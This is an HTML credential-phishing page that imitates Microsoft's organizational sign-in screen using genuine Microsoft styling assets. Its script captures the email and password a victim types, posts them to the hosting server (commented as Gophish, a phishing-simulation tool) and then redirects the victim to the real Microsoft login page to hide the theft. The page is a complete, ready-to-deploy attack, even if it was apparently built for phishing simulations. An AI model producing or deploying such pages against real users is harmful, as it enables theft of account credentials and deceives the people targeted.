<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to Microsoft Online Services</title>
    <meta http-equiv="Pragma" content="no-cache"/>
    <meta http-equiv="Expires" content="-1"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <link rel="shortcut icon" href="https://web.archive.org/web/20211124193620/https://secure.aadcdn.microsoftonline-p.com/aad/20.200.19625/images/favicon_a.ico" />
    <link rel="stylesheet" href="https://secure.aadcdn.microsoftonline-p.com/aad/20.200.19625/css/login.ltr.css">
    <script src="https://secure.aadcdn.microsoftonline-p.com/aad/20.200.19625/js/jquery.1.5.1.min.js"></script>
    <script src="https://secure.aadcdn.microsoftonline-p.com/aad/20.200.19625/js/aad.login.js"></script>
</head>
<body>
    <div class="login_panel">
        <div class="login_inner_container">
            <div class="inner_container cred">
                <h2>Sign in with your organizational account</h2>
                <form action="" method="POST" id="phishingForm">
                    <input type="email" name="email" placeholder="someone@example.com" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <input type="submit" value="Sign In">
                </form>
            </div>
        </div>
    </div>

    <script>
        document.getElementById("phishingForm").onsubmit = function(e) {
            e.preventDefault(); // Prevent default form submission

            // Capture the data
            var email = document.querySelector("input[name='email']").value;
            var password = document.querySelector("input[name='password']").value;

            // Send to Gophish
            fetch(window.location.href, {
                method: "POST",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`
            });

            // Redirect to the legitimate Microsoft login page
            window.location.href = "https://login.microsoftonline.com/";
        };
    </script>
</body>
</html>
